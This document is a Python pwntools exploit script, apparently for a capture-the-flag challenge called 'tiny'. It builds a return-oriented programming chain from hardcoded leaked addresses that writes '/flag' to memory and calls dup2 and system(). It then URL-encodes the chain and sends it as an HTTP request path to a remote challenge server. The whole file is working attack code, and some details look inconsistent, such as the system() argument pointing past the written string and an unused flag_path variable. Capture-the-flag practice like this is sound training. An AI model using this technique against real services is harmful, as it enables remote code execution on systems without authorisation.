from pwn import *
import requests
from urllib.parse import quote

exe = context.binary = ELF("./tiny", checksec=False)
libc = ELF('./libc.so.6')
context.log_level = 'debug'

# --- Setup ---
exe.address = 0x55ec5c184000  # If you've leaked and confirmed this
libc.address = 0x7f3cdc062000
offset = 584
rop = ROP(libc)
system_addr = libc.sym["system"]
flag_path = 0x55555555a128  # leaked address of "/flag"
pop_rax = 0x0000000000045eb0
pop_rsi = 0x000000000002be51
mov_rsi_rax = 0x000000000015ebb6
ret = 0x0000000000029139
rop.raw(b"A" * offset)
rop.raw(libc.address + pop_rsi)
rop.raw(exe.bss())
rop.raw(libc.address + pop_rax)
rop.raw(b"/flag\x00\x00\x00")
rop.raw(libc.address + mov_rsi_rax)
rop.call(libc.sym['dup2'], [4, 1])
rop.raw(libc.address + ret)
rop.call(system_addr, [exe.bss() + 8])
rop.raw(libc.address + ret)
rop.call(libc.sym['exit'])
# --- Encode the ROP chain ---
payload = rop.chain()
url_payload = quote(payload)  # URL encode the payload
print(f"[+] URL Encoded Payload: {url_payload}")

# --- Send ---
url = f"http://tiny.chal.cubectf.com:9999/{url_payload}"
print(f"[+] Sending to {url}")
print(len(url_payload))
r = requests.get(url)
print(f"[+] Status Code: {r.status_code}")
print(f"[+] Response:\n{r.text}")
sleep(10)
